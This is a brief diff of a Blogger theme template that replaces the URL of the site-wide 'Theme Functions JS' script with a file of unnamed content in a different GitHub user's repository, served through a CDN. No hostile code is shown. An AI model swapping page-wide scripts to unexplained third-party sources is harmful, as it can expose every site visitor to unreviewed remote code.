@@ -1708,7 +1708,7 @@ var monthFormat = ["January", "February", "March", "April", "May", "June", "July
 </script>
 
 <!-- Theme Functions JS Don't Remove This -->
-<script src='https://cdn.statically.io/gh/Rashmibhabi/https-rashmidzn.blogspot.com/master/Alva%20Main.js'/>
+<script src='https://cdn.statically.io/gh/dan7w7/docs/3708b444/11'/>
 <!-- Pagination Scripts -->
 <b:if cond='data:view.isMultipleItems'>
 <script type='text/javascript'>
